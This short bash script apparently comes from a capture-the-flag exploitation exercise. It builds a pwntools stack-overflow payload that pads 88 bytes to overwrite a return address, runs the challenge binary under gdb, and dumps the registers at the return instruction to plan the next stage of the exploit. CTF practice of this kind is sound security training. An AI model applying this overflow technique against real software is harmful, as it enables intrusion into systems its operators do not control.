#!/bin/bash
cd /work/waf/waf
python3 - <<'PY'
from pwn import *
# payload that returns to a distinctive addr so we can inspect regs right at ret
p=b"exit"+b"A"*(88-4)+p64(0xdeadbeef)  # will crash at ret; inspect regs at 0x401373
open("/tmp/pl.bin","wb").write(p)
PY
cat > /tmp/gs <<'EOF'
set pagination off
break *0x401373
run < /tmp/pl.bin
printf "RDI=%#lx RSI=%#lx RDX=%#lx RCX=%#lx R8=%#lx R9=%#lx R13=%#lx RBP=%#lx RSP=%#lx\n", $rdi,$rsi,$rdx,$rcx,$r8,$r9,$r13,$rbp,$rsp
printf "rbp-0x38 -> "
x/1gx $rbp-0x38
printf "[r13] -> "
x/1gx $r13
EOF
gdb -q -batch -x /tmp/gs ./chal_remote > /tmp/g.txt 2>&1
grep -E "RDI=|rbp-0x38|r13|Cannot access" /tmp/g.txt
